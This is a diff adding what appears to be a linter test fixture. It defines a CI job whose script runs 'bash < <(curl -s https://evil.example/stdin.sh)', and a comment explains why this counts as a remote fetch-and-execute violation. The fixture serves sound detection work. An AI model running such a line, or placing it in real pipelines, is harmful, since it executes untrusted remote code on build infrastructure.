@@ -1,0 +1,8 @@
+# violation: a shell reading a fetched script through stdin redirected
+# from a process substitution runs it exactly as `<shell> <(curl ...)`
+# does, just with the substitution fed to stdin instead of named as an
+# argument.
+stdin_procsub:
+  image: alpine:3.19
+  script:
+    - bash < <(curl -s https://evil.example/stdin.sh)
